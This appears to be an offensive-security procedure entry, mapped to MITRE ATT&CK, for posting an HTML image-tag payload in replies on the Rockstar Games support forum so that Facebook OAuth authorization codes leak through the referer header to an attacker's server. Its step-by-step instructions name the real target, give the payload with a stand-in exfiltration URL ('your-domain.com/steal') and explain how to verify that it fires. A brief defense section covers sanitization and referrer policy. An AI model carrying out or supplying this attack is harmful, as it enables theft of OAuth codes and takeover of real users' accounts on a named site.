---
id: proc-uuid-1
tags:
  - forum-injection
  - html-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:38.982Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-Malicious-Image-Tag-into-Forum-Reply

## Summary

This procedure involves injecting a malicious HTML <img> tag into replies on the support.rockstargames.com forum to facilitate referer header leakage when the reply is viewed.

## Description

The Rockstar Support Community forum allows users to post replies that may parse HTML without proper sanitization. By embedding an <img src="https://attacker-controlled-domain.com/endpoint"> tag, the attacker sets up a mechanism for external resource loading. When a victim views the reply during a sensitive operation like Facebook OAuth, the browser includes the referer header with the OAuth authorization code in the request to the attacker's domain. This targets public-facing web forums integrated with OAuth flows lacking referer policy enforcement.

## Requirements

1. Access to create a forum account and post replies (public forum, minimal barriers)
2. Control over an external domain and server to host the endpoint
3. Knowledge of the target forum's HTML parsing behavior

## Defense

Defensive measures and detection strategies:

- Implement strict HTML sanitization in forum posts to strip or escape <img> tags
- Enforce Referrer-Policy: no-referrer or strict-origin on OAuth-related pages
- Monitor for anomalous external resource loads from forum content

## Objectives

1. Establish a persistent payload in the forum for passive exploitation
2. Prepare for referer-based data exfiltration
3. Enable drive-by compromise without direct victim interaction

## Instructions

### Step 1: Register and Access Forum Thread

**Context**: Gain initial access to post in an active thread to maximize visibility.

Navigate to support.rockstargames.com, create an account if required, and select a popular thread.

### Step 2: Craft and Post Malicious Reply

**Context**: Insert the payload in the reply body to trigger img loading on view.

In the reply editor, add text with embedded HTML: "Check this out: <img src=\"https://your-domain.com/steal\" alt=\"placeholder\">". Submit the reply.

> Ensure the forum renders the img tag without escaping; inspect the posted HTML source to confirm.

### Step 3: Verify Payload Persistence

**Context**: Confirm the payload remains and loads externally.

Refresh the thread and use browser dev tools (Network tab) to check if the img src request fires to your domain.

> Expected: 200 OK response or log entry on your server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[forum-injection]]
- [[html-injection]]
